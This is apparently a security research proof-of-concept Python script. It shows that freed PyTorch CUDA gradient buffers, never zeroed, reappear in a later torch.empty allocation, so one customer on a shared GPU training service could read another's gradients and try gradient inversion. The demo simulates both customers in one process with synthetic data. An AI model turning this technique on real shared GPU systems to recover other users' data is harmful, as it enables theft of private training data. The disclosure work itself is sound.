"""
Experiment 10: Training Gradient Leak

In a shared GPU training server (federated learning, fine-tuning API),
gradient tensors encode sensitive information about the training data.
If gradient buffers are freed to the PyTorch pool, the next user's
torch.empty allocation gets those gradient values.

Real-world impact:
  - Gradient Inversion Attacks (Zhu et al., 2019): given gradients, can
    reconstruct the training images/text with high fidelity
  - Training-as-a-Service (TaaS) APIs share GPU memory between customers
  - If Customer A's gradients leak to Customer B, Customer B can run
    gradient inversion to partially reconstruct Customer A's training data

Attack scenario:
  Customer A fine-tunes on private medical text (gradient of loss encodes words)
  Customer A's training step completes, gradient buffers freed to pool
  Customer B allocates output buffers → gets Customer A's gradients
  Customer B runs gradient inversion to identify Customer A's training tokens
"""

import torch
import torch.nn as nn
import sys


class SmallTransformerLayer(nn.Module):
    """Single transformer layer (attention + FFN), realistic gradient sizes."""
    def __init__(self, d_model=2048, n_heads=16, ffn_mult=4):
        super().__init__()
        self.attn_q = nn.Linear(d_model, d_model, bias=False)
        self.attn_k = nn.Linear(d_model, d_model, bias=False)
        self.attn_v = nn.Linear(d_model, d_model, bias=False)
        self.attn_o = nn.Linear(d_model, d_model, bias=False)
        self.ffn1   = nn.Linear(d_model, d_model * ffn_mult, bias=False)
        self.ffn2   = nn.Linear(d_model * ffn_mult, d_model, bias=False)
        self.norm1  = nn.LayerNorm(d_model)
        self.norm2  = nn.LayerNorm(d_model)

    def forward(self, x):
        # Simplified attention (no softmax for speed)
        B, T, D = x.shape
        q = self.attn_q(x)
        k = self.attn_k(x)
        v = self.attn_v(x)
        attn = torch.bmm(q, k.transpose(1, 2)) / (D ** 0.5)
        out  = torch.bmm(attn, v)
        x    = self.norm1(x + self.attn_o(out))
        x    = self.norm2(x + self.ffn2(torch.relu(self.ffn1(x))))
        return x


def run():
    if not torch.cuda.is_available():
        print("CUDA not available"); sys.exit(1)

    print("=" * 62)
    print("Training Gradient Leak PoC")
    print(f"Device: {torch.cuda.get_device_name(0)}")
    print("=" * 62)

    D_MODEL = 2048
    N_HEADS = 16
    BATCH   = 4
    SEQ_LEN = 128

    print(f"\nModel: 1 transformer layer, d_model={D_MODEL}")
    print(f"Training batch: {BATCH} sequences × {SEQ_LEN} tokens\n")

    # ------------------------------------------------------------------
    # Customer A: trains on private data
    # ------------------------------------------------------------------
    print("[1] Customer A: loading model and running training step...")
    model_a = SmallTransformerLayer(D_MODEL, N_HEADS).cuda()
    optimizer = torch.optim.Adam(model_a.parameters(), lr=1e-4)

    # Secret training data (encoded as a float tensor — represents token embeddings)
    SECRET_SIGNAL = 3.14159    # recognizable gradient signal
    x_train = torch.full((BATCH, SEQ_LEN, D_MODEL), SECRET_SIGNAL,
                          dtype=torch.float32, device="cuda")

    # Forward pass
    output = model_a(x_train)
    loss   = output.mean()

    # Backward pass — gradients written to model_a.parameters().grad
    optimizer.zero_grad()
    loss.backward()
    torch.cuda.synchronize()

    # Capture gradient values for comparison
    q_grad_ptr  = model_a.attn_q.weight.grad.data_ptr()
    q_grad_vals = model_a.attn_q.weight.grad.cpu()[:4, :4].tolist()
    grad_size_b = model_a.attn_q.weight.grad.numel() * 4  # fp32
    print(f"    attn_q.weight.grad ptr    : 0x{q_grad_ptr:x}")
    print(f"    attn_q.weight.grad [0,:4] : {[f'{v:.6f}' for v in q_grad_vals[0]]}")
    print(f"    Gradient tensor size      : {grad_size_b/1024:.1f} KB")

    # ------------------------------------------------------------------
    # Customer A done: model freed (gradients freed to pool)
    # ------------------------------------------------------------------
    print(f"\n[2] Customer A training step done — model and grads freed...")
    del output, loss, x_train
    optimizer.zero_grad(set_to_none=True)    # grads set to None → freed to pool
    del model_a, optimizer
    torch.cuda.synchronize()
    print(f"    All gradient tensors freed to PyTorch pool (NOT zeroed)")

    # ------------------------------------------------------------------
    # Customer B: allocates output buffers of same size
    # ------------------------------------------------------------------
    print(f"\n[3] Customer B: allocating output tensor (same size as q grad)...")
    GRAD_SHAPE = (D_MODEL, D_MODEL)
    leaked = torch.empty(GRAD_SHAPE, dtype=torch.float32, device="cuda")
    torch.cuda.synchronize()

    leaked_ptr = leaked.data_ptr()
    leaked_cpu = leaked.cpu()
    nonzero    = (leaked_cpu.abs() > 1e-8).sum().item()
    total      = leaked_cpu.numel()

    print(f"    Leaked buffer ptr   : 0x{leaked_ptr:x}")
    print(f"    Same as grad tensor : {leaked_ptr == q_grad_ptr}")
    print(f"    Non-zero elements   : {nonzero}/{total} ({100.0*nonzero/total:.1f}%)")
    print(f"    Leaked [0,:4]       : {[f'{v:.6f}' for v in leaked_cpu[0,:4].tolist()]}")
    print(f"    Grad was  [0,:4]    : {[f'{v:.6f}' for v in q_grad_vals[0]]}")

    if leaked_ptr == q_grad_ptr:
        match = (leaked_cpu - leaked_cpu[0, 0]).abs().max().item() < 0.01
        print(f"\n[!!!] SAME ADDRESS — Customer A's gradients in Customer B's buffer!")
        print(f"    With gradient inversion (Zhu et al.), these values can be used")
        print(f"    to reconstruct Customer A's private training data.")
        print(f"    Gradient signal (SECRET_SIGNAL={SECRET_SIGNAL}) visible: "
              f"{abs(leaked_cpu.mean().item() - q_grad_vals[0][0]) < 0.1}")
    elif nonzero > total * 0.5:
        print(f"\n[~] Different address but {100.0*nonzero/total:.1f}% non-zero gradient data visible")
        print(f"    Pool contains gradient residue from Customer A's backward pass")
    else:
        print(f"\n[=] Allocator returned a fresh block for this size class")
        print(f"    Run again or adjust batch size to match pool size class")

    del leaked
    print("\n[Done]")


if __name__ == "__main__":
    run()
